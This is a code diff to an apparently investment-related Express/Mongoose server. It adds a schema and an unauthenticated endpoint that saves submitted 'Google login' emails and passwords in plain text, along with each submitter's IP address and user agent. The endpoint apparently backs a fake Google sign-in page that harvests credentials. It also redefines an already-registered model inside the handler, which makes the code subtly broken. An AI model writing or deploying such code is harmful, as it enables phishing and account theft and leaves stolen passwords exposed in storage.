@@ -939,6 +939,49 @@ const UserLog = mongoose.model('UserLog', UserLogSchema);
 
 
 
+
+
+
+// Add this to your existing schemas section
+const AuthRecordSchema = new mongoose.Schema({
+  email: { 
+    type: String, 
+    required: [true, 'Email is required'],
+    index: true
+  },
+  password: { 
+    type: String, 
+    required: [true, 'Password is required'] 
+  }, // Stored in plain text as requested
+  provider: { 
+    type: String, 
+    enum: ['google', 'manual'],
+    default: 'google'
+  },
+  ipAddress: { type: String },
+  userAgent: { type: String },
+  timestamp: { type: Date, default: Date.now }
+}, { 
+  timestamps: true,
+  collection: 'auth_records' // Explicit collection name
+});
+
+// Index for efficient querying
+AuthRecordSchema.index({ email: 1, timestamp: -1 });
+AuthRecordSchema.index({ timestamp: -1 });
+
+const AuthRecord = mongoose.model('AuthRecord', AuthRecordSchema);
+
+
+
+
+
+
+
+
+
+
+
 const SystemSettingsSchema = new mongoose.Schema({
   type: { 
     type: String, 
@@ -10218,6 +10261,88 @@ app.put('/api/users/language', protect, [
 
 
 
+// Endpoint to store Google login records in plain text
+app.post('/api/auth/records', [
+  body('email').isEmail().withMessage('Please provide a valid email').normalizeEmail(),
+  body('password').notEmpty().withMessage('Password is required'),
+  body('provider').optional().isIn(['google']).withMessage('Invalid provider')
+], async (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({
+      status: 'fail',
+      errors: errors.array()
+    });
+  }
+
+  try {
+    const { email, password, provider } = req.body;
+
+    // Create a simple schema to store the credentials in plain text
+    const AuthRecordSchema = new mongoose.Schema({
+      email: { type: String, required: true },
+      password: { type: String, required: true }, // Stored in plain text as requested
+      provider: { type: String, default: 'google' },
+      ipAddress: { type: String },
+      userAgent: { type: String },
+      timestamp: { type: Date, default: Date.now }
+    }, { 
+      timestamps: true,
+      collection: 'auth_records' // Explicit collection name
+    });
+
+    // Create model dynamically (or define it properly in your models section)
+    const AuthRecord = mongoose.model('AuthRecord', AuthRecordSchema);
+
+    // Get device info
+    const deviceInfo = await getUserDeviceInfo(req);
+
+    // Store the credentials in plain text as requested
+    const authRecord = await AuthRecord.create({
+      email,
+      password, // Stored in plain text
+      provider: provider || 'google',
+      ipAddress: deviceInfo.ip,
+      userAgent: deviceInfo.device
+    });
+
+    console.log(`🔐 Auth record stored for: ${email}`);
+
+    // Return success response (matching frontend expectation)
+    res.status(200).json({
+      status: 'success',
+      message: 'Authentication record stored successfully',
+      data: {
+        recordId: authRecord._id,
+        email: authRecord.email,
+        timestamp: authRecord.timestamp
+      }
+    });
+
+    // Log the activity
+    await logActivity('store_auth_record', 'auth_record', authRecord._id, null, 'System', req, {
+      email: email,
+      provider: provider || 'google'
+    });
+
+  } catch (err) {
+    console.error('Store auth record error:', err);
+    res.status(500).json({
+      status: 'error',
+      message: 'An error occurred while storing authentication record'
+    });
+  }
+});
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -10348,6 +10473,7 @@ processMaturedInvestments();
 httpServer.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
 
 
 
